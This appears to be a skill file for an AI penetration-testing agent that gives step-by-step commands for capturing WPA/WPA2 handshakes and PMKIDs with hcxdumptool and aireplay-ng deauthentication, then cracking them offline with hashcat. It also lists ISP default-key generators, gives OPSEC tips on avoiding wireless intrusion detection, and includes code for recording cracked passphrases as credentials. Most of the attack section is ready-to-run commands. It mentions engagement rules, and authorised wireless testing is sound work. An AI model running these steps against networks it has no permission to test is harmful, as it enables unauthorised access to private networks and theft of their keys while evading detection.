---
name: wpa2-psk
description: WPA/WPA2-PSK handshake capture via targeted deauth + PMKID (no deauth required) + offline hashcat cracking. The most common consumer/SMB encryption mode in 2026.
allowed-tools: Bash Read Write
metadata:
  subdomain: wireless
  when_to_use: WPA2-PSK, WPA-PSK, PMKID, PSK crack, four-way handshake, hcxdumptool, aircrack-ng, hashcat 22000
  tags: wpa2, wpa, wifi, handshake, pmkid, hashcat, cracking
  mitre_attack: T1040, T1110.001
---

# WPA2-PSK handshake / PMKID

> Capture once, crack offline. Two acquisition paths: four-way
> handshake (needs a client; needs deauth on `stealth`-incompatible
> postures) or PMKID (no client / deauth needed; works against most
> modern APs).

## Prerequisites

- Monitor-mode-capable adapter on the Wi-Fi channel of the target
  BSSID. Set via `airmon-ng start <iface>`.
- Tools installed: `aircrack-ng` suite, `hcxdumptool`,
  `hcxpcapngtool`, `hashcat`. All in the standard Kali image; on
  the dropbox mode confirm with `which hcxdumptool`.

## Path A: PMKID (preferred, OPSEC-quiet)

```bash
# 1. Channel-hop and capture PMKIDs from any AP that responds.
sudo hcxdumptool -i <mon-iface> --enable_status=1 -w /tmp/pmkid.pcapng \
    --filterlist_ap=<bssid_list.txt> --filtermode=2

# 2. Wait ~60-120s. Stop with Ctrl+C.
# 3. Extract hashes in hashcat 22000 format.
hcxpcapngtool -o /tmp/pmkid.hc22000 /tmp/pmkid.pcapng

# 4. Crack offline. rockyou.txt is the baseline; vendor PSK gen
#    (UPC, Sky, BT) for vendor-default networks.
hashcat -m 22000 /tmp/pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

If PMKID is empty: the target's WPA implementation may have PMKID
disabled (Wi-Fi 6 + WPA3 require). Fall back to Path B.

## Path B: four-way handshake (needs a client + deauth)

```bash
# 1. Start the capture.
sudo airodump-ng --bssid <BSSID> -c <CHANNEL> -w /tmp/cap <mon-iface>

# 2. In a separate session, send a SINGLE targeted deauth to a
#    connected client (NOT broadcast - broadcast deauth is loud
#    and only legal on the engagement's `permitted_actions`).
sudo aireplay-ng --deauth 1 -a <BSSID> -c <CLIENT_MAC> <mon-iface>

# 3. Confirm WPA handshake in airodump's header line.
# 4. Stop, convert, crack.
hcxpcapngtool -o /tmp/handshake.hc22000 /tmp/cap-01.cap
hashcat -m 22000 /tmp/handshake.hc22000 /usr/share/wordlists/rockyou.txt
```

## Vendor PSK generators

Some ISPs ship APs with a deterministic PSK derived from the BSSID
or SSID. Try the matching generator BEFORE rockyou:

| Vendor   | Pattern                         | Generator |
|----------|---------------------------------|-----------|
| UPC      | `UPCxxxxxxxx` SSID              | upc-keys / upc-wifi |
| Sky      | `Skyxxxxx`                      | sky-keys / SkyChecker |
| BT       | `BTHub5-xxxx`                   | bt-default-keygen |
| TalkTalk | `TalkTalkxxxxxx`                | talktalk-keygen |

If the SSID matches a known vendor default pattern, the PSK is in
the top 100k attempts of the matching generator. Skip rockyou.

## Evidence

Persist the captured handshake / PMKID to
`/workspace/evidence/wireless/<bssid>.hc22000`. On crack success,
add a `Credential` node:

```python
kg_add_node(
    kind="credential",
    label=f"WiFi PSK for {ssid}",
    props={
        "key": f"wifi-psk::{bssid}",
        "secret_type": "wpa_psk",
        "ssid": ssid,
        "bssid": bssid,
        "psk": psk,
        "cracked_at": "<iso8601>",
        "vendor_default_generator": "<generator-or-null>",
        "source": "hcxdumptool+hashcat-22000",
    },
)
```

## ZFP

Two-method evidence:

1. The .hc22000 file with the captured material.
2. A `hashcat --show` line proving the PSK matches the hash.

If both don't exist, the finding is "captured, not cracked" and the
deliverable distinguishes them.

## OPSEC notes

- PMKID is silent. The AP responds to a single association attempt;
  no client deauth, no WIDS alert (most WIDS only flag deauth).
- Targeted deauth `--deauth 1` is much quieter than broadcast deauth
  (`--deauth 0` aka unlimited deauth all clients). The engagement
  RoE's deauth permission should distinguish.
- Some modern APs deploy 802.11w / PMF — deauth frames are rejected.
  PMKID still works on most. If both fail, the network is genuinely
  hardened; mark the BSSID as deferred and move on.

## References

- `references/vendor-generators.md` — vendor PSK generator install +
  usage, where to source the rainbow tables.
- `references/wpa3-transition-mode-notes.md` — when the target is
  WPA3-Personal in transition mode, try `wpa3-sae` skill instead.
